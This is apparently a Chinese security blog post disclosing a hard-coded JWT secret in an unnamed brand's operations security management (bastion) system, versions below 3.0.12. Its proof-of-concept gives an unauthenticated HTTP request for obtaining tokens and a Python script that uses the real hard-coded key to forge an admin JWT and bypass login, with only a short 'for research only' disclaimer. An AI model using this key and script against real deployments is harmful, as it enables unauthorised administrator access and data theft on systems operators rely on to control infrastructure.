#  【0day】某知名品牌运维安全管理系统 Jwt 密钥硬编码  
 0day收割机   2026-03-05 08:20  
  
# 漏洞简介  
  
某知名品牌运维安全管理系统存在 Jwt 密钥硬编码漏洞。攻击者可通过分析应用程序代码或通过其他方式获取硬编码的 Jwt 密钥，利用该密钥伪造 Jwt Token，从而绕过身份认证机制，实现未授权访问系统功能或敏感信息，可能导致越权操作、数据泄露等严重后果。  
# 影响版本  
  
低于 3.0.12 20241106  
## POC  
> 未授权获取actionToken、accessToken  
  
```
GET /fort/login/search_login HTTP/1.1
Host: 

```  
  
伪造合法的Jwt签名token  
> 伪造一个登录用户名 admin  
  
```
import jwt
import time

# 从代码中获取的硬编码密钥
SECRET_KEY = "69fad654821b991725e62fb65ee464da"

# 伪造的用户信息
payload = {
    "loginName": "admin",
    "userId": "1000000000001",
    "exp": int(time.time()) + 43200  # 设置一个未来的过期时间
}

# JWT Header
headers = {
  "typ": "JWT",
  "alg": "HS256"
}

# 使用获取的密钥签名，生成伪造的token
forged_token = jwt.encode(payload, SECRET_KEY, algorithm="HS256", headers=headers)

print(forged_token)
```  
  
仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。  
  
